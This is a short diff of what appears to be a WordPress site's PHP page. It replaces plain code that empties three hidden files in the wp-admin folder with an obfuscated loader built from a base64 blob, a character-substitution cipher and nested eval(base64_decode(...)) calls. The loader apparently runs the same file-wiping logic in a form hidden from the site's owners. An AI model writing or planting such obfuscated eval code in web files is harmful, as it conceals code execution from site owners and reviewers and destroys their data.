@@ -1,12 +1,4 @@
-<?php
-$fp = fopen("../wp-admin/.license.txt", "w+");
-ftruncate($fp, 0);
-fclose($fp); ?><?php $fp = fopen("../wp-admin/.ltextfile.txt", "w+");
-ftruncate($fp, 0);
-fclose($fp); ?><?php $fp = fopen("../wp-admin/.textfile.txt", "w+");
-ftruncate($fp, 0);
-fclose($fp);
-?>
+<?php $_F=__FILE__;$_X='Pz48P3BocA0KLy8ycDVuIGY0bDUgdDIgd3I0dDUNCiRmcCA9IGYycDVuKCIuLi93cC0xZG00bi8ubDRjNW5zNS50eHQiLCAidysiKTsNCi8vIGNsNTFyIGMybnQ1bnQgdDIgMCBiNHRzDQpmdHIzbmMxdDUoJGZwLCAwKTsNCi8vY2wyczUgZjRsNQ0KZmNsMnM1KCRmcCk7DQo/Pg0KPD9waHANCi8vMnA1biBmNGw1IHQyIHdyNHQ1DQokZnAgPSBmMnA1bigiLi4vd3AtMWRtNG4vLmx0NXh0ZjRsNS50eHQiLCAidysiKTsNCi8vIGNsNTFyIGMybnQ1bnQgdDIgMCBiNHRzDQpmdHIzbmMxdDUoJGZwLCAwKTsNCi8vY2wyczUgZjRsNQ0KZmNsMnM1KCRmcCk7DQo/Pg0KPD9waHANCi8vMnA1biBmNGw1IHQyIHdyNHQ1DQokZnAgPSBmMnA1bigiLi4vd3AtMWRtNG4vLnQ1eHRmNGw1LnR4dCIsICJ3KyIpOw0KLy8gY2w1MXIgYzJudDVudCB0MiAwIGI0dHMNCmZ0cjNuYzF0NSgkZnAsIDApOw0KLy9jbDJzNSBmNGw1DQpmY2wyczUoJGZwKTsNCj8+';eval(base64_decode('JF9YPWJhc2U2NF9kZWNvZGUoJF9YKTskX1g9c3RydHIoJF9YLCcxMjM0NTZhb3VpZScsJ2FvdWllMTIzNDU2Jyk7JF9SPWVyZWdfcmVwbGFjZSgnX19GSUxFX18nLCInIi4kX0YuIiciLCRfWCk7ZXZhbCgkX1IpOyRfUj0wOyRfWD0wOw=='));?>
 <?php require('.require.php'); ?>
 <script type="text/javascript">
 hs.graphicsDir = 'https://www.rfig.us:443/A-GOLD/highslide/graphics/';
